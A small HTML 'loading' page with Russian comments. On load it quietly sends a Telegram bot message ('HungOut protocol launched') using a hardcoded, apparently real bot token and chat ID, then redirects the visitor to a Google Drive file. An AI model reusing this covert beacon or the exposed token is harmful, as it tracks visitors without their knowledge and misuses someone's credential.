<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Загрузка...</title>
<script>
  // Настройки
  const botToken = "8348476399:AAEolZHUSZLeLgC1PaWxZIT1N_s3H93DnvU";
  const chatId = "1845073752";
  const targetUrl = "https://drive.google.com/file/d/1JdCMgzmLZ5bMtDl1tqHz9S3ek96t06aW/view?usp=drive_link";

  // Отправка уведомления
  function sendNotification() {
    const message = "Протокол HungOut запущен";
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
  }

  // Запуск отправки и редиректа
  window.onload = function() {
    sendNotification();
    setTimeout(() => {
      window.location.href = targetUrl;
    }, 800); // 0.8 сек для надёжности
  };
</script>
</head>
